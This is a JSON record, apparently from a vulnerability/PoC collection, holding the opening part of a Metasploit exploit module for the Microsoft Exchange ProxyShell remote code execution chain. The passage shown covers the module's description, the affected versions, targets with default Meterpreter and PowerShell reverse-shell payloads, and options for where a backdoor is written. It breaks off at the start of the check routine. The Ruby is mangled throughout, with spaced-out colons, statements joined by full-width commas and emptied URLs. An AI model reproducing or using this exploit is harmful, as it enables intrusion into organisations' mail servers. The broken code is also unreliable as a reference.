{
    "text": "vul_name : Microsoft Exchange ProxyShell Remote Code Execution ， vul_cve : CVE-2021-31207 , CVE-2021-34473 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'winrm' ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : CmdStager ， include Msf : Exploit : FileDropper ， include Msf : Exploit : Powershell ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : EXE ， super (  ， update_info (  ， info ,  ， 'Name' => 'Microsoft Exchange ProxyShell RCE' ,  ， 'Description' => %q{ ， This module exploit a vulnerability on Microsoft Exchange Server that ， allows an attacker to bypass the authentication ( CVE-2021-31207 )  , impersonate an ， arbitrary user ( CVE-2021-34523 ) and write an arbitrary file ( CVE-2021-34473 ) to achieve ， the RCE ( Remote Code Execution ) . ， By taking advantage of this vulnerability , you can execute arbitrary ， commands on the remote Microsoft Exchange Server. ， This vulnerability affects Exchange 2013 CU23 < 15.0.1497.15 ,  ， Exchange 2016 CU19 < 15.1.2176.12 , Exchange 2016 CU20 < 15.1.2242.5 ,  ， Exchange 2019 CU8 < 15.2.792.13 , Exchange 2019 CU9 < 15.2.858.9. ， All components are vulnerable by default. ， } ,  ， 'Author' => [  ， 'Orange Tsai' ,  # Discovery ， 'Jang (  @ testanull ) ' ,  # Vulnerability analysis ， 'PeterJson' ,  # Vulnerability analysis ， 'brandonshi123' ,  # Vulnerability analysis ， 'mekhalleh ( RAMELLA Sbastien ) ' ,  # exchange_proxylogon_rce template ， 'Spencer McIntyre' ,  # Metasploit module ， 'wvu' # Testing ，  ]  ,  ， ' ，  [ 'CVE' , '2021-34473' ]  ,  ，  [ 'CVE' , '2021-34523' ]  ,  ，  [ 'CVE' , '2021-31207' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'DisclosureDate' => '2021-04-06' ,  # pwn2own 2021 ， 'License' => MSF_LICENSE ,  ， 'DefaultOptions' => { ， 'RPORT' => 443 ,  ， 'SSL' => true ， } ,  ， 'Platform' => [ 'windows' ]  ,  ， 'Arch' => [ ARCH_CMD , ARCH_X64 , ARCH_X86 ]  ,  ， 'Privileged' => true ,  ， 'Targets' => [  ，  [  ， 'Windows Powershell' ,  ， { ， 'Platform' => 'windows' ,  ， 'Arch' => [ ARCH_X64 , ARCH_X86 ]  ,  ， 'Type' => : windows_powershell ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp' ， } ， } ，  ]  ,  ，  [  ， 'Windows Dropper' ,  ， { ， 'Platform' => 'windows' ,  ， 'Arch' => [ ARCH_X64 , ARCH_X86 ]  ,  ， 'Type' => : windows_dropper ,  ， 'CmdStagerFlavor' => %i [ psh_invokewebrequest ]  ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp' ,  ， 'CMDSTAGER : FLAVOR' => 'psh_invokewebrequest' ， } ， } ，  ]  ,  ，  [  ， 'Windows Command' ,  ， { ， 'Platform' => 'windows' ,  ， 'Arch' => [ ARCH_CMD ]  ,  ， 'Type' => : windows_command ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp' ， } ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'SideEffects' => [ ARTIFACTS_ON_DISK , IOC_IN_LOGS ]  ,  ， 'AKA' => [ 'ProxyShell' ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ， } ， register_options (  [  ， OptString.new ( 'EMAIL' ,  [ true , 'A known email address for this organization' ]  )  ,  ， OptBool.new ( 'UseAlternatePath' ,  [ true , 'Use the IIS root dir as alternate path' , false ]  )  ,  ，  ]  )  ， register_advanced_options (  [  ， OptString.new ( 'BackendServerName' ,  [ false , 'Force the name of the backend Exchange server targeted' ]  )  ,  ， OptString.new ( 'ExchangeBasePath' ,  [ true , 'The base path where exchange is installed' , 'C : \\Program Files\\Microsoft\\Exchange Server\\V15' ]  )  ,  ， OptString.new ( 'ExchangeWritePath' ,  [ true , 'The path where you want to write the backdoor' , 'owa\\auth' ]  )  ,  ， OptString.new ( 'IISBasePath' ,  [ true , 'The base path where IIS wwwroot directory is' , 'C : \\inetpub\\wwwroot' ]  )  ,  ， OptString.new ( 'IISWritePath' ,  [ true , 'The path where you want to write the backdoor' , 'aspnet_client' ]  )  ,  ， OptString.new ( 'MapiClientApp' ,  [ true , 'This is MAPI client version sent in the request' , 'Outlook/15.0.4815.1002' ]  )  ,  ， OptString.new ( 'UserAgent' ,  [ true , 'The HTTP User-Agent sent in the request' , 'Mozilla/5.0' ]  )  ，  ]  )  ， end ， def check ，  @ ssrf_email | = Faker : Internet.email ， res = send_http ( 'GET' , '/mapi/nspi/' ) ",
    "time": "2021.08.21"
}